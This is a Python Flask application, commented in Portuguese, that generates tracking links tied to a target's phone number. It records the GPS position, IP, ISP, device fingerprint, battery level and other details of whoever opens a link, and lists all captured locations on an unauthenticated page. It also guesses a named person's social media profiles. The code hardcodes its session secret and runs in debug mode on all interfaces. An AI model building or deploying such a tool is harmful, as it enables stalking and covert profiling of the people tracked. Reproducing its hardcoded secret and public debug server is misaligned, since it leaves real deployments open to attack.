import os
import logging
import json
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, session
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from sqlalchemy.orm import DeclarativeBase
from werkzeug.middleware.proxy_fix import ProxyFix
from datetime import datetime
from geopy.geocoders import Nominatim

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Create the app
app = Flask(__name__, template_folder='.', static_folder='.', static_url_path='/static')
# Definir uma chave secreta fixa para garantir o funcionamento da sessão
app.secret_key = "mtelus_angola_secure_key_2025"
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1) # needed for url_for to generate with https

# Configure the database
db_url = os.environ.get("DATABASE_URL")
if not db_url:
    # Fallback para SQLite se não houver DATABASE_URL
    logger.warning("DATABASE_URL não está definido, usando SQLite como fallback")
    db_url = "sqlite:///phone_locator.db"
else:
    # Garantir que o URL do PostgreSQL seja compatível com SQLAlchemy
    if db_url.startswith("postgres://"):
        db_url = db_url.replace("postgres://", "postgresql://", 1)
    logger.info("Usando banco de dados PostgreSQL")

app.config["SQLALCHEMY_DATABASE_URI"] = db_url
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

# Log the database connection string (without password)
if db_url and "://" in db_url:
    safe_url = db_url.split("://")[0] + "://" + db_url.split("@")[-1] if "@" in db_url else db_url
    logger.info(f"Using database: {safe_url}")

# Initialize the app with the extension
db.init_app(app)
migrate = Migrate(app, db)

# Import models and views after app is created to avoid circular imports
with app.app_context():
    # Import models
    import models  # noqa: F401
    from models import SearchHistory, TrackingLink, TrackedLocation
    
    # Import phone locator functionality
    from phone_locator import parse_phone_number, get_phone_location, get_client_location, create_map
    
    # Import IP analyzer functionality
    from ip_analyzer import get_ip_details, get_map_html
    
    # Use Flask-Migrate for database migrations instead of create_all()
    # This will handle schema changes properly
    
    # Force create tables since we're reorganizing the project
    try:
        db.create_all()
        logger.info("Database tables created successfully")
    except Exception as e:
        logger.error(f"Error creating database tables: {str(e)}")

# Routes
@app.route('/')
def welcome():
    return render_template('welcome.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/home')
def index():
    return render_template('index.html')

@app.route('/location_tracker')
def location_tracker():
    """
    Interface para criar links de rastreamento GPS.
    Esta página permite criar links para rastrear a localização em tempo real.
    """
    return render_template('location_tracker.html')

@app.route('/create_tracking_link', methods=['POST'])
def create_tracking_link():
    """
    Cria um link de rastreamento para um número de telefone.
    Esta função é chamada da página de Rastreamento GPS.
    """
    phone_number = request.form.get('phone_number', '').strip()
    
    if not phone_number:
        flash('Por favor, insira um número de telefone', 'danger')
        return redirect(url_for('location_tracker'))
    
    try:
        # Parse and validate the phone number
        parsed_number, is_valid, country, carrier = parse_phone_number(phone_number)
        
        if not is_valid:
            flash('Formato de número de telefone inválido', 'danger')
            return redirect(url_for('location_tracker'))
        
        # Expire all previous tracking links for this phone number
        TrackingLink.query.filter_by(
            phone_number=parsed_number.national_number,
            is_expired=False
        ).update({TrackingLink.is_expired: True})
        
        # Create a new tracking link
        tracking_link = TrackingLink(
            phone_number=parsed_number.national_number,
            is_expired=False
        )
        db.session.add(tracking_link)
        db.session.commit()
        
        # Generate tracking URL
        tracking_url = url_for('track', tracking_id=tracking_link.tracking_id, _external=True)
        
        # Return the tracking page with the new link
        return render_template('tracking_link_created.html', 
                              phone_number=phone_number,
                              country=country,
                              carrier=carrier,
                              tracking_url=tracking_url)
    
    except Exception as e:
        logger.error(f"Erro ao criar link de rastreamento: {str(e)}")
        flash(f'Erro ao criar link de rastreamento: {str(e)}', 'danger')
        return redirect(url_for('location_tracker'))

@app.route('/search', methods=['POST'])
def search():
    phone_number = request.form.get('phone_number', '').strip()
    
    if not phone_number:
        flash('Por favor, insira um número de telefone', 'danger')
        return redirect(url_for('index'))
    
    try:
        # Parse and validate the phone number
        parsed_number, is_valid, country, carrier = parse_phone_number(phone_number)
        
        if not is_valid:
            flash('Formato de número de telefone inválido', 'danger')
            return redirect(url_for('index'))
        
        # Get geolocation information
        location_info = get_phone_location(parsed_number.national_number, country)
        
        if not location_info:
            flash('Não foi possível localizar este número de telefone', 'warning')
            return redirect(url_for('index'))
        
        # Save search to history
        new_search = SearchHistory(
            phone_number=parsed_number.national_number,
            country_code=country,
            carrier=carrier or "Unknown",
            latitude=location_info['latitude'],
            longitude=location_info['longitude'],
            address=location_info['address'],
            search_time=datetime.now()
        )
        db.session.add(new_search)
        db.session.commit()
        
        # Não criar mais links de rastreamento automaticamente na busca de localização
        # A criação de links de rastreamento agora é feita através da página de rastreamento
        tracking_url = None
        
        # Return the results page with location data and tracking link
        return render_template('search_result.html', 
                              phone_number=phone_number,
                              country=country,
                              carrier=carrier,
                              location=location_info,
                              tracking_url=tracking_url)
    
    except Exception as e:
        logger.error(f"Erro ao processar número de telefone: {str(e)}")
        flash(f'Erro ao processar número de telefone: {str(e)}', 'danger')
        return redirect(url_for('index'))

@app.route('/history')
def history():
    search_history = SearchHistory.query.order_by(SearchHistory.search_time.desc()).limit(50).all()
    return render_template('history.html', history=search_history)

@app.route('/clear_history', methods=['POST'])
def clear_history():
    try:
        SearchHistory.query.delete()
        db.session.commit()
        flash('Histórico de busca foi limpo', 'success')
    except Exception as e:
        logger.error(f"Erro ao limpar histórico: {str(e)}")
        flash(f'Erro ao limpar histórico: {str(e)}', 'danger')
    
    return redirect(url_for('history'))

@app.route('/track/<tracking_id>')
def track(tracking_id):
    """
    Track user location when they click on a tracking link.
    Shows page that will request GPS permission from user's device.
    """
    try:
        # Check if tracking ID exists and is not expired 
        tracking_link = TrackingLink.query.filter_by(tracking_id=tracking_id, is_expired=False).first()
        
        if not tracking_link:
            # Return error page if tracking ID is invalid or expired
            return render_template('track_error.html')
        
        # Just render the tracking page - actual location will be collected via JavaScript
        return render_template('tracked.html', tracking_id=tracking_id)
    
    except Exception as e:
        logger.error(f"Erro ao preparar página de rastreamento: {str(e)}")
        return render_template('track_error.html')

@app.route('/submit_location/<tracking_id>', methods=['POST'])
def submit_location(tracking_id):
    """
    Receive GPS coordinates from the client's browser via JavaScript
    with enhanced device fingerprinting
    """
    try:
        # Check if tracking ID exists and is not expired
        tracking_link = TrackingLink.query.filter_by(tracking_id=tracking_id, is_expired=False).first()
        
        if not tracking_link:
            return jsonify({"error": "Link de rastreamento inválido ou expirado"}), 400
        
        # Obter as informações de localização e dispositivo usando a função aprimorada
        location_data = get_client_location(request)
        
        if not location_data:
            return jsonify({"error": "Erro ao obter dados de localização"}), 500
            
        # Extrair coordenadas e dados básicos
        latitude = location_data.get('latitude')
        longitude = location_data.get('longitude')
        altitude = location_data.get('altitude')
        accuracy = location_data.get('accuracy')
        address = location_data.get('address', "Localização desconhecida")
        ip_address = location_data.get('ip')
        user_agent = location_data.get('user_agent', '')
        
        # Extrair informações avançadas do dispositivo
        device_model = location_data.get('device_model', '')
        browser_name = location_data.get('browser_name', '')
        browser_version = location_data.get('browser_version', '')
        os_name = location_data.get('os_name', '')
        os_version = location_data.get('os_version', '')
        screen_size = location_data.get('screen_size', '')
        connection_type = location_data.get('connection_type', '')
        device_fingerprint = location_data.get('device_fingerprint', '')
        isp = location_data.get('isp', '')
        timezone = location_data.get('browser_timezone', '')
        battery_level = location_data.get('battery_level')
        
        # Dados brutos para armazenamento
        device_info_json = location_data.get('device_info_json', '{}')
        
        # Extrair idioma do navegador
        language = location_data.get('accept_language', '').split(',')[0] if location_data.get('accept_language') else ''
        
        # Determinar tipo de dispositivo
        device_type = location_data.get('device', {}).get('device_type', 'Desconhecido')
        
        # Criar string de plataforma
        platform_info = f"{os_name} {os_version}"
        if device_model:
            platform_info += f" - {device_model}"
            
        # Preparar parâmetros para o modelo TrackedLocation
        params = {
            'tracking_id': tracking_id,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'latitude': latitude,
            'longitude': longitude,
            'altitude': altitude,
            'accuracy': accuracy,
            'address': address,
            'platform': platform_info,
            'device_model': device_model,
            'browser_name': browser_name,
            'browser_version': browser_version,
            'os_name': os_name,
            'os_version': os_version,
            'screen_size': screen_size,
            'connection_type': connection_type, 
            'device_fingerprint': device_fingerprint,
            'isp': isp,
            'timezone': timezone,
            'language': language,
            'device_type': device_type,
            'battery_level': battery_level,
            'device_info_json': device_info_json
        }
        
        # Create and save tracked location with enhanced parameters
        tracked_location = TrackedLocation(**params)
        db.session.add(tracked_location)
        db.session.commit()
        
        # Create map with the tracked location
        map_html = create_map(
            latitude,
            longitude,
            address
        )
        
        # Criar objeto dispositivo com os dados detalhados
        device_info = {
            'model': device_model,
            'os': os_name,
            'browser': browser_name,
            'screenSize': screen_size,
            'ipAddress': ip_address,
            'language': language,
            'userAgent': user_agent
        }
        
        # Return location data with map and additional info
        response_data = {
            "success": True,
            "latitude": latitude,
            "longitude": longitude,
            "altitude": altitude,
            "accuracy": accuracy,
            "address": address,
            "deviceInfo": device_info,
            "mapHtml": map_html,
            "ip": ip_address,
            "isp": isp,
            "timezone": timezone
        }
        
        return jsonify(response_data)
    
    except Exception as e:
        logger.error(f"Erro ao processar localização: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/tracking_results')
def tracking_results():
    """
    View all tracked locations.
    """
    # Get all tracked locations grouped by tracking ID
    tracking_data = {}
    tracked_locations = TrackedLocation.query.order_by(TrackedLocation.timestamp.desc()).all()
    
    for location in tracked_locations:
        if location.tracking_id not in tracking_data:
            # Find the associated phone number
            tracking_link = TrackingLink.query.filter_by(tracking_id=location.tracking_id).first()
            phone_number = tracking_link.phone_number if tracking_link else "Unknown"
            
            tracking_data[location.tracking_id] = {
                "phone_number": phone_number,
                "locations": []
            }
        
        tracking_data[location.tracking_id]["locations"].append(location)
    
    return render_template('tracking_results.html', tracking_data=tracking_data)

@app.route('/social_search')
def social_search():
    """
    Interface para buscar perfis sociais por nome.
    """
    return render_template('social_search.html')

@app.route('/ip_search')
def ip_search():
    """
    Interface para busca e análise de endereço IP.
    """
    return render_template('ip_search.html')

@app.route('/check_phishing', methods=['GET'])
def check_phishing_page():
    """
    Display phishing detection form
    """
    return render_template('check_phishing.html')

@app.route('/check_phishing', methods=['POST'])
def check_phishing():
    """
    Check if a URL is potentially a phishing site
    """
    url = request.form.get('url', '').strip()
    
    if not url:
        flash('Por favor, insira uma URL para verificar', 'danger')
        return redirect(url_for('check_phishing_page'))
        
    from phishing_detector import check_phishing_url
    is_phishing, confidence, details = check_phishing_url(url)
    
    return render_template('phishing_result.html',
                         url=url,
                         is_phishing=is_phishing,
                         confidence=confidence,
                         details=details)

@app.route('/email_analysis')
def email_analysis():
    """
    Interface para análise de email
    """
    return render_template('email_analysis.html')

@app.route('/analyze_email', methods=['POST'])
def analyze_email_address():
    """
    Analisa um endereço de email usando a API IPQS
    """
    email = request.form.get('email', '').strip()
    
    if not email:
        flash('Por favor, insira um endereço de email', 'danger')
        return redirect(url_for('email_analysis'))
        
    from email_analyzer import analyze_email
    email_data = analyze_email(email)
    
    if 'error' in email_data:
        flash(f'Erro ao analisar email: {email_data["error"]}', 'danger')
        return redirect(url_for('email_analysis'))
        
    return render_template('email_analysis.html', email_data=email_data)

@app.route('/ip_search_results', methods=['POST'])
def ip_search_results():
    """
    Processa a busca por IP e exibe resultados detalhados.
    """
    ip_address = request.form.get('ip_address', '').strip()
    
    if not ip_address:
        return render_template('ip_search.html', error='Por favor, insira um endereço IP ou domínio válido.')
    
    try:
        # Obter detalhes completos do IP
        ip_data = get_ip_details(ip_address)
        
        # Verificar se há erro
        if 'error' in ip_data:
            return render_template('ip_search.html', error=ip_data['error'])
            
        # Gerar mapa se houver coordenadas geográficas
        map_html = ""
        if ip_data.get('latitude') and ip_data.get('longitude'):
            location_name = f"{ip_data.get('city', '')}, {ip_data.get('country', '')}"
            map_html = get_map_html(
                ip_data['latitude'],
                ip_data['longitude'],
                location_name
            )
        
        # Renderizar página de resultados
        return render_template('ip_search.html', ip_data=ip_data, map_html=map_html)
        
    except Exception as e:
        logger.error(f"Erro ao analisar IP: {str(e)}")
        return render_template('ip_search.html', error=f"Erro ao analisar IP: {str(e)}")

@app.route('/buscar_perfil', methods=['POST'])
def buscar_perfil():
    """
    API para buscar perfis sociais com base em um nome.
    Verifica a existência e agrupa por rede social.
    """
    import requests
    import trafilatura
    import re

    nome = request.form.get('nome', '').strip()
    
    if not nome:
        return jsonify({'erro': 'Nome não fornecido'}), 400
        
    resultados = {
        'facebook': [],
        'instagram': [],
        'linkedin': [],
        'twitter': []
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        # Facebook - busca mais avançada
        fb_url = f"https://www.facebook.com/public/{nome.replace(' ', '-')}"
        try:
            downloaded = trafilatura.fetch_url(fb_url)
            if downloaded:
                extracted_text = trafilatura.extract(downloaded)
                if extracted_text and re.search(r'perfil|profile|pessoas|people', extracted_text, re.IGNORECASE):
                    resultados['facebook'].append({
                        'nome': nome,
                        'url': fb_url,
                        'verificado': True
                    })
                else:
                    # Ainda incluímos o link, mas marcamos como não verificado
                    resultados['facebook'].append({
                        'nome': nome,
                        'url': fb_url,
                        'verificado': False
                    })
        except Exception as e:
            logger.error(f"Erro ao verificar Facebook: {str(e)}")
            resultados['facebook'].append({
                'nome': nome,
                'url': fb_url,
                'verificado': False
            })
        
        # Instagram
        insta_url = f"https://www.instagram.com/{nome.replace(' ', '')}"
        try:
            response = requests.head(insta_url, headers=headers, timeout=5)
            if response.status_code == 200:
                resultados['instagram'].append({
                    'nome': nome.replace(' ', ''),
                    'url': insta_url,
                    'verificado': True
                })
            else:
                # Usar a URL de busca como alternativa
                insta_search_url = f"https://www.instagram.com/web/search/topsearch/?query={nome.replace(' ', '%20')}"
                resultados['instagram'].append({
                    'nome': nome,
                    'url': insta_search_url,
                    'verificado': False
                })
        except Exception as e:
            logger.error(f"Erro ao verificar Instagram: {str(e)}")
            resultados['instagram'].append({
                'nome': nome,
                'url': insta_url,
                'verificado': False
            })
        
        # LinkedIn
        linkedin_url = f"https://www.linkedin.com/search/results/people/?keywords={nome.replace(' ', '%20')}"
        resultados['linkedin'].append({
            'nome': nome,
            'url': linkedin_url,
            'verificado': True  # LinkedIn sempre redireciona para resultados de busca
        })
        
        # Twitter
        twitter_url = f"https://twitter.com/search?q={nome.replace(' ', '%20')}&f=user"
        resultados['twitter'].append({
            'nome': nome,
            'url': twitter_url,
            'verificado': True  # Twitter sempre redireciona para resultados de busca
        })
        
        return jsonify(resultados)
        
    except Exception as e:
        logger.error(f"Erro ao buscar perfis sociais: {str(e)}")
        return jsonify({'erro': str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
